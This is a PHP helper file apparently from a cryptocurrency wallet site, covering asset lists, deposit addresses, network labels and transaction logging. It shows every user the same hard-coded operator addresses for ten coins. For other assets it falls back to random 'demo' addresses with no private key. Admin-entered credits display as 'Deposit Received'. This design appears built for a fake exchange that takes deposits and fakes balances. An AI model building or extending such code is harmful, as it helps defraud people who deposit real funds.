<?php
/**
 * Shared wallet helpers used by receive.php, send.php, swap.php, buy.php,
 * dashboard.php and the admin panel.
 */

function wallet_supported_assets(): array {
    return ['BTC', 'ETH', 'USDT', 'BNB', 'SOL', 'XRP', 'TRX', 'DOGE', 'LTC', 'XLM'];
}

/** Full display name for an asset ticker, e.g. BTC -> Bitcoin. */
function asset_label(string $ticker): string {
    $map = [
        'BTC' => 'Bitcoin', 'ETH' => 'Ethereum', 'USDT' => 'Tether', 'BNB' => 'BNB',
        'SOL' => 'Solana', 'XRP' => 'Ripple', 'TRX' => 'Tron', 'DOGE' => 'Dogecoin',
        'LTC' => 'Litecoin', 'XLM' => 'Stellar',
    ];
    return $map[$ticker] ?? $ticker;
}

/** Logs a wallet-connection event (link-wallet page, or admin-side linking). */
function log_wallet_connection(int $userId, string $address, string $method = 'manual', string $status = 'success'): void {
    $stmt = db()->prepare('INSERT INTO wallet_connections (user_id, address, method, status) VALUES (?,?,?,?)');
    $stmt->execute([$userId, $address, $method, $status]);
}

/**
 * Real platform deposit addresses shown to every user for a given asset.
 * Add new ones here as they're provided — any asset left out falls back
 * to a random per-user demo address below.
 */
function wallet_platform_addresses(): array {
    return [
        'BTC'  => 'bc1qum59cfj4ml332lyu5pz97mn0exmm3l7x68pywv',
        'ETH'  => '0xC86BF8b56c97823C7a3b581EB1574287CD1Bea5e',
        'BNB'  => '0xC86BF8b56c97823C7a3b581EB1574287CD1Bea5e', // same EVM address as ETH
        'USDT' => 'TKB9F61s3R628dCwMiGaKdH4U4orPcNPbG', // USDT-TRC20 (Tron network)
        'XRP'  => 'rPbjQiezcFTYDhwisduokJ59Fu7RHgWJ1q',
        'SOL'  => 'xLbhKHoE1mAgc25jt2i5t2bod2U9qxmGSutsj4j3kZW',
        'TRX'  => 'TKB9F61s3R628dCwMiGaKdH4U4orPcNPbG', // same address as USDT (both on Tron)
        'DOGE' => 'DNGbpceEhVnH4xtYfY98VGmN2JLZ3mpvf2',
        'LTC'  => 'LUPuYUaSGgamsiq1ibnnsDovtNzmGvvVjR',
        'XLM'  => 'GD3QCNGKKZV65OCTQ37G4RUBAXQXEU7CJDD5SQ2GH2D4MBZZOF74ZZO3',
    ];
}

/** Network label shown under the address for assets that need one (multi-network coins). */
function wallet_network_labels(): array {
    return [
        'ETH'  => 'ERC-20 / Ethereum Network',
        'BNB'  => 'BEP-20 / BSC Network',
        'USDT' => 'TRC-20 / Tron Network',
        'XRP'  => 'XRP Ledger',
        'BTC'  => 'Bitcoin Network',
        'SOL'  => 'Solana Network',
        'TRX'  => 'Tron Network',
        'DOGE' => 'Dogecoin Network',
        'LTC'  => 'Litecoin Network',
        'XLM'  => 'Stellar Network',
    ];
}

/** Extra reserve/memo warnings shown for assets that need them, matching the source wallet. */
function wallet_network_notes(): array {
    return [
        'XRP' => 'The XRP network requires a minimum balance of 1 XRP to keep this address active. No destination tag is required.',
        'XLM' => 'The XLM network requires a minimum balance of 1 XLM to keep this address active. No memo is required.',
    ];
}

/**
 * Returns the deposit address to show for the given asset: a fixed
 * platform address when one is set, otherwise a random per-user demo
 * address (generated and saved on first use).
 */
function get_or_create_wallet_address(array $user, string $asset = 'BTC'): string {
    $fixed = wallet_platform_addresses();
    if (isset($fixed[$asset])) {
        return $fixed[$asset];
    }
    if (!empty($user['wallet_address'])) {
        return $user['wallet_address'];
    }
    $addr = '0x' . bin2hex(random_bytes(20));
    $stmt = db()->prepare('UPDATE users SET wallet_address = ? WHERE id = ?');
    $stmt->execute([$addr, $user['id']]);
    return $addr;
}

/** Logs a wallet transaction row. */
function log_transaction(int $userId, string $type, string $asset, float $amountUsd, ?string $counterAsset = null, ?string $destination = null, ?string $note = null): void {
    $stmt = db()->prepare('INSERT INTO transactions (user_id, type, asset, amount_usd, counter_asset, destination, note) VALUES (?,?,?,?,?,?,?)');
    $stmt->execute([$userId, $type, $asset, $amountUsd, $counterAsset, $destination, $note]);
}

/** Human-readable label + tone class for a transaction type, for the dashboard ledger. */
function tx_label(string $type): array {
    return match ($type) {
        'send' => ['Sent', 'down'],
        'receive' => ['Received', 'up'],
        'swap' => ['Swapped', 'neutral'],
        'buy' => ['Bought', 'up'],
        'admin_credit' => ['Deposit Received', 'up'],
        'admin_debit' => ['Adjustment', 'down'],
        default => [ucfirst($type), 'neutral'],
    };
}
